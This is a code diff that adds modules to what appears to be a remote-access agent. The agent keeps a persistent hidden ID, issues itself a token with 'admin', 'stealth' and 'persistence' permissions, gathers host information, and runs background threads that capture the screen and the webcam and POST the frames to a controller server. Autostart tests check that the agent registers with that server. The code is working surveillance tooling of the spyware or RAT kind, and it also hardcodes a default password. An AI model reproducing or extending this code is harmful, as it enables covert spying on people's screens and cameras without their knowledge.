@@ -54,6 +54,9 @@ from datetime import datetime, timedelta
 from functools import wraps
 import signal
 import atexit
+import secrets
+import hmac
+import hashlib
 
 # Advanced logging configuration
 logging.basicConfig(
@@ -65,6 +68,14 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+    CRYPTOGRAPHY_AVAILABLE = True
+except ImportError:
+    CRYPTOGRAPHY_AVAILABLE = False
 
 try:
     import win32api
@@ -5195,6 +5206,578 @@ def test_process_termination_functionality():
             break
         except Exception as e:
             print(f"Error: {e}")
+
+# ========================================================================================
+# From enhanced_agent.py - Enhanced Python Agent with Comprehensive Improvements
+# ========================================================================================
+
+import sys
+import os
+import time
+import threading
+import logging
+from typing import Optional, Dict, Any, List
+
+# Set up logging for enhanced features
+enhanced_logger = logging.getLogger('enhanced_agent')
+
+class EnhancedAgent:
+    """Enhanced agent with all improvements integrated"""
+    
+    def __init__(self, server_url: str = "http://localhost:8080"):
+        self.server_url = server_url
+        self.agent_id = self._generate_agent_id()
+        self.running = False
+        
+        # Enhanced components
+        self.stream_manager = None
+        self.security = None
+        
+        # Legacy support
+        self.streaming_enabled = False
+        self.camera_streaming_enabled = False
+        
+        # Initialize enhanced features
+        self._initialize_enhancements()
+        
+        enhanced_logger.info(f"Enhanced agent initialized with ID: {self.agent_id}")
+    
+    def _generate_agent_id(self) -> str:
+        """Generate unique agent ID"""
+        try:
+            # Try to read existing ID
+            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
+            if os.path.exists(id_file):
+                with open(id_file, 'r') as f:
+                    return f.read().strip()
+        except:
+            pass
+        
+        # Generate new ID
+        agent_id = str(uuid.uuid4())
+        
+        try:
+            # Save ID for persistence
+            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
+            with open(id_file, 'w') as f:
+                f.write(agent_id)
+        except:
+            pass
+        
+        return agent_id
+    
+    def _initialize_enhancements(self):
+        """Initialize enhanced features"""
+        try:
+            # Initialize streaming manager
+            self.stream_manager = StreamManager(self.server_url, self.agent_id)
+            enhanced_logger.info("Enhanced streaming manager initialized")
+            
+            # Initialize security features
+            self.security = SecurityEnhancements()
+            token = self.security.initialize_security(self.agent_id)
+            enhanced_logger.info(f"Security features initialized with token: {token[:20]}...")
+            
+        except Exception as e:
+            enhanced_logger.error(f"Error initializing enhancements: {e}")
+
+# ========================================================================================
+# From security_improvements.py - Security Improvements and Advanced Features
+# ========================================================================================
+
+class SecureAuth:
+    """Secure authentication system with token-based auth"""
+    
+    def __init__(self, secret_key: Optional[str] = None):
+        self.secret_key = secret_key or secrets.token_urlsafe(32)
+        self.active_tokens: Dict[str, Dict[str, Any]] = {}
+        self.max_token_age = 3600  # 1 hour
+        
+    def generate_token(self, agent_id: str, permissions: List[str] = None) -> str:
+        """Generate a secure authentication token"""
+        permissions = permissions or ["basic"]
+        
+        token_data = {
+            "agent_id": agent_id,
+            "permissions": permissions,
+            "created_at": time.time(),
+            "expires_at": time.time() + self.max_token_age,
+            "nonce": secrets.token_hex(16)
+        }
+        
+        # Create token signature
+        token_string = json.dumps(token_data, sort_keys=True)
+        signature = hmac.new(
+            self.secret_key.encode(),
+            token_string.encode(),
+            hashlib.sha256
+        ).hexdigest()
+        
+        token = base64.b64encode(f"{token_string}:{signature}".encode()).decode()
+        self.active_tokens[token] = token_data
+        
+        return token
+
+class SecurityEnhancements:
+    """Main security enhancements manager"""
+    
+    def __init__(self, password: str = "default_password"):
+        self.auth = SecureAuth()
+        self.password = password
+        
+    def initialize_security(self, agent_id: str) -> str:
+        """Initialize all security features"""
+        # Generate authentication token
+        token = self.auth.generate_token(agent_id, ["admin", "stealth", "persistence"])
+        return token
+    
+    def gather_intelligence(self) -> Dict[str, Any]:
+        """Gather comprehensive system intelligence"""
+        intelligence = {
+            "system_info": {
+                "hostname": socket.gethostname(),
+                "platform": platform.system(),
+                "architecture": platform.architecture(),
+                "processor": platform.processor()
+            },
+            "timestamp": time.time()
+        }
+        
+        return {
+            "data": intelligence,
+            "status": "success"
+        }
+    
+    def cleanup_and_exit(self):
+        """Clean up and exit safely"""
+        pass
+
+# ========================================================================================
+# From streaming_fixes.py - Streaming Fixes and Improvements
+# ========================================================================================
+
+class StreamingStats:
+    """Track streaming performance statistics"""
+    
+    def __init__(self):
+        self.frames_sent = 0
+        self.bytes_sent = 0
+        self.frames_dropped = 0
+        self.start_time = time.time()
+        self.last_fps_time = time.time()
+        self.fps = 0
+        
+    def update_frame(self, bytes_count: int):
+        """Update stats when a frame is sent"""
+        self.frames_sent += 1
+        self.bytes_sent += bytes_count
+        
+        # Calculate FPS every second
+        current_time = time.time()
+        if current_time - self.last_fps_time >= 1.0:
+            self.fps = self.frames_sent / (current_time - self.start_time)
+            self.last_fps_time = current_time
+    
+    def drop_frame(self):
+        """Record dropped frame"""
+        self.frames_dropped += 1
+    
+    def get_stats(self) -> Dict[str, Any]:
+        """Get current statistics"""
+        runtime = time.time() - self.start_time
+        return {
+            "runtime": runtime,
+            "frames_sent": self.frames_sent,
+            "frames_dropped": self.frames_dropped,
+            "bytes_sent": self.bytes_sent,
+            "fps": self.fps,
+            "avg_frame_size": self.bytes_sent / max(1, self.frames_sent),
+            "drop_rate": self.frames_dropped / max(1, self.frames_sent + self.frames_dropped)
+        }
+
+class ImprovedScreenStreamer:
+    """Improved screen streaming with better error handling and performance"""
+    
+    def __init__(self, server_url: str, agent_id: str, target_fps: int = 30):
+        self.server_url = server_url
+        self.agent_id = agent_id
+        self.target_fps = target_fps
+        self.frame_time = 1.0 / target_fps
+        self.running = False
+        self.thread: Optional[threading.Thread] = None
+        
+        # Performance tracking
+        self.stats = StreamingStats()
+        
+        # Connection settings
+        self.url = f"{server_url}/stream/{agent_id}"
+        self.headers = {'Content-Type': 'image/jpeg'}
+        self.timeout = 0.1
+        
+    def start(self):
+        """Start the streaming thread"""
+        if not self.running:
+            self.running = True
+            self.thread = threading.Thread(target=self._stream_loop, daemon=True)
+            self.thread.start()
+    
+    def stop(self):
+        """Stop the streaming thread"""
+        if self.running:
+            self.running = False
+            if self.thread:
+                self.thread.join(timeout=5)
+    
+    def _stream_loop(self):
+        """Main streaming loop with enhanced error handling"""
+        with mss.mss() as sct:
+            consecutive_errors = 0
+            max_consecutive_errors = 10
+            
+            while self.running and consecutive_errors < max_consecutive_errors:
+                try:
+                    frame_start = time.time()
+                    
+                    # Capture screen
+                    monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
+                    sct_img = sct.grab(monitor)
+                    frame = np.array(sct_img)
+                    
+                    # Handle different color formats
+                    if frame.shape[2] == 4:  # BGRA
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
+                    elif frame.shape[2] == 3:  # BGR
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                    
+                    # Resize large frames for better performance
+                    height, width = frame.shape[:2]
+                    if width > 1920:
+                        scale = 1920 / width
+                        new_width = int(width * scale)
+                        new_height = int(height * scale)
+                        frame = cv2.resize(frame, (new_width, new_height))
+                    
+                    # Convert RGB to BGR for OpenCV
+                    frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+                    
+                    # Encode with quality
+                    success, buffer = cv2.imencode('.jpg', frame_bgr, [cv2.IMWRITE_JPEG_QUALITY, 85])
+                    
+                    if success:
+                        # Send frame
+                        response = requests.post(
+                            self.url, 
+                            data=buffer.tobytes(), 
+                            headers=self.headers, 
+                            timeout=self.timeout
+                        )
+                        
+                        if response.status_code == 200:
+                            consecutive_errors = 0
+                            self.stats.update_frame(len(buffer.tobytes()))
+                        else:
+                            consecutive_errors += 1
+                            self.stats.drop_frame()
+                    else:
+                        consecutive_errors += 1
+                        self.stats.drop_frame()
+                    
+                    # Maintain target FPS
+                    elapsed = time.time() - frame_start
+                    sleep_time = max(0, self.frame_time - elapsed)
+                    if sleep_time > 0:
+                        time.sleep(sleep_time)
+                    
+                except Exception as e:
+                    consecutive_errors += 1
+                    time.sleep(0.1)
+
+class ImprovedCameraStreamer:
+    """Improved camera streaming with better error handling"""
+    
+    def __init__(self, server_url: str, agent_id: str, camera_id: int = 0, target_fps: int = 30):
+        self.server_url = server_url
+        self.agent_id = agent_id
+        self.camera_id = camera_id
+        self.target_fps = target_fps
+        self.frame_time = 1.0 / target_fps
+        self.running = False
+        self.thread: Optional[threading.Thread] = None
+        
+        # Performance tracking
+        self.stats = StreamingStats()
+        
+        # Camera settings
+        self.cap: Optional[cv2.VideoCapture] = None
+        self.url = f"{server_url}/camera/{agent_id}"
+        self.headers = {'Content-Type': 'image/jpeg'}
+        self.timeout = 0.5
+    
+    def start(self):
+        """Start camera streaming"""
+        if not self.running:
+            if self._init_camera():
+                self.running = True
+                self.thread = threading.Thread(target=self._stream_loop, daemon=True)
+                self.thread.start()
+    
+    def stop(self):
+        """Stop camera streaming"""
+        if self.running:
+            self.running = False
+            if self.thread:
+                self.thread.join(timeout=5)
+            if self.cap:
+                self.cap.release()
+    
+    def _init_camera(self) -> bool:
+        """Initialize camera with proper settings"""
+        try:
+            self.cap = cv2.VideoCapture(self.camera_id)
+            if not self.cap or not self.cap.isOpened():
+                return False
+            
+            # Set camera properties
+            self.cap.set(cv2.CAP_PROP_FPS, self.target_fps)
+            self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+            self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+            self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+            
+            # Test capture
+            ret, frame = self.cap.read()
+            if not ret or frame is None:
+                return False
+            
+            return True
+            
+        except Exception as e:
+            return False
+    
+    def _stream_loop(self):
+        """Main camera streaming loop"""
+        consecutive_errors = 0
+        max_consecutive_errors = 10
+        
+        while self.running and consecutive_errors < max_consecutive_errors:
+            try:
+                frame_start = time.time()
+                
+                # Capture frame
+                ret, frame = self.cap.read()
+                if not ret or frame is None:
+                    consecutive_errors += 1
+                    time.sleep(0.1)
+                    continue
+                
+                # Encode frame
+                success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
+                
+                if success:
+                    # Send frame
+                    response = requests.post(
+                        self.url,
+                        data=buffer.tobytes(),
+                        headers=self.headers,
+                        timeout=self.timeout
+                    )
+                    
+                    if response.status_code == 200:
+                        consecutive_errors = 0
+                        self.stats.update_frame(len(buffer.tobytes()))
+                    else:
+                        consecutive_errors += 1
+                        self.stats.drop_frame()
+                else:
+                    consecutive_errors += 1
+                    self.stats.drop_frame()
+                
+                # Maintain target FPS
+                elapsed = time.time() - frame_start
+                sleep_time = max(0, self.frame_time - elapsed)
+                if sleep_time > 0:
+                    time.sleep(sleep_time)
+                
+            except Exception as e:
+                consecutive_errors += 1
+                time.sleep(0.1)
+
+class StreamManager:
+    """Manages multiple streams and provides status information"""
+    
+    def __init__(self, server_url: str, agent_id: str):
+        self.server_url = server_url
+        self.agent_id = agent_id
+        self.screen_streamer: Optional[ImprovedScreenStreamer] = None
+        self.camera_streamer: Optional[ImprovedCameraStreamer] = None
+    
+    def start_screen_stream(self, fps: int = 30):
+        """Start screen streaming"""
+        if self.screen_streamer is None or not self.screen_streamer.running:
+            self.screen_streamer = ImprovedScreenStreamer(
+                self.server_url, self.agent_id, fps
+            )
+            self.screen_streamer.start()
+            return True
+        return False
+    
+    def stop_screen_stream(self):
+        """Stop screen streaming"""
+        if self.screen_streamer and self.screen_streamer.running:
+            self.screen_streamer.stop()
+            return True
+        return False
+    
+    def start_camera_stream(self, fps: int = 30, camera_id: int = 0):
+        """Start camera streaming"""
+        if self.camera_streamer is None or not self.camera_streamer.running:
+            self.camera_streamer = ImprovedCameraStreamer(
+                self.server_url, self.agent_id, camera_id, fps
+            )
+            self.camera_streamer.start()
+            return True
+        return False
+    
+    def stop_camera_stream(self):
+        """Stop camera streaming"""
+        if self.camera_streamer and self.camera_streamer.running:
+            self.camera_streamer.stop()
+            return True
+        return False
+    
+    def stop_all_streams(self):
+        """Stop all active streams"""
+        self.stop_screen_stream()
+        self.stop_camera_stream()
+    
+    def get_status(self) -> Dict[str, Any]:
+        """Get streaming status and statistics"""
+        status = {
+            "screen_streaming": False,
+            "camera_streaming": False,
+            "screen_stats": None,
+            "camera_stats": None
+        }
+        
+        if self.screen_streamer and self.screen_streamer.running:
+            status["screen_streaming"] = True
+            status["screen_stats"] = self.screen_streamer.stats.get_stats()
+        
+        if self.camera_streamer and self.camera_streamer.running:
+            status["camera_streaming"] = True
+            status["camera_stats"] = self.camera_streamer.stats.get_stats()
+        
+        return status
+
+# ========================================================================================
+# From test_autostart.py - Test functionality for autostart
+# ========================================================================================
+
+def test_server_startup():
+    """Test that we can start the controller server"""
+    print("🔧 Testing server startup...")
+    
+    try:
+        # Start the controller in background
+        controller_process = subprocess.Popen([
+            sys.executable, 'controller.py'
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Wait a moment for server to start
+        time.sleep(3)
+        
+        # Test server status endpoint
+        try:
+            response = requests.get('http://localhost:8080/status', timeout=5)
+            if response.status_code == 200:
+                print("✅ Controller server started successfully")
+                print(f"   Status: {response.json()}")
+                return controller_process
+            else:
+                print(f"❌ Server returned status code: {response.status_code}")
+                return None
+        except requests.exceptions.RequestException as e:
+            print(f"❌ Failed to connect to server: {e}")
+            return None
+            
+    except Exception as e:
+        print(f"❌ Failed to start controller: {e}")
+        return None
+
+def test_agent_autostart():
+    """Test the agent autostart functionality"""
+    print("\n🚀 Testing agent autostart...")
+    
+    try:
+        # Start the agent
+        agent_process = subprocess.Popen([
+            sys.executable, 'python_agent.py'
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        print("   Agent process started, waiting for autostart connection...")
+        time.sleep(10)  # Give time for autostart to work
+        
+        # Check if agent registered with server
+        try:
+            response = requests.get('http://localhost:8080/status', timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                active_agents = data.get('active_agents', 0)
+                if active_agents > 0:
+                    print(f"✅ Agent autostart successful! {active_agents} agent(s) connected")
+                    return agent_process
+                else:
+                    print("⚠️  Agent started but no connections detected")
+                    return agent_process
+            else:
+                print(f"❌ Server status check failed: {response.status_code}")
+                return None
+        except requests.exceptions.RequestException as e:
+            print(f"❌ Failed to check server status: {e}")
+            return None
+            
+    except Exception as e:
+        print(f"❌ Failed to start agent: {e}")
+        return None
+
+def run_autostart_tests():
+    """Main test function for autostart functionality"""
+    print("=" * 60)
+    print("ENHANCED AGENT AUTOSTART TEST SUITE")
+    print("=" * 60)
+    
+    controller_process = None
+    agent_process = None
+    
+    try:
+        # Test 1: Start controller
+        controller_process = test_server_startup()
+        if not controller_process:
+            print("\n❌ Cannot continue tests without controller")
+            return False
+        
+        # Test 2: Test agent autostart
+        agent_process = test_agent_autostart()
+        if not agent_process:
+            print("\n❌ Agent autostart test failed")
+            return False
+        
+        print("\n" + "=" * 60)
+        print("✅ AUTOSTART TEST SUITE COMPLETED")
+        print("=" * 60)
+        
+        return True
+        
+    except KeyboardInterrupt:
+        print("\n⚠️  Test interrupted by user")
+        return False
+    except Exception as e:
+        print(f"\n❌ Test suite error: {e}")
+        return False
+    finally:
+        if controller_process:
+            controller_process.terminate()
+        if agent_process:
+            agent_process.terminate()
 
 # ========================================================================================
 # END OF COMBINED MODULES
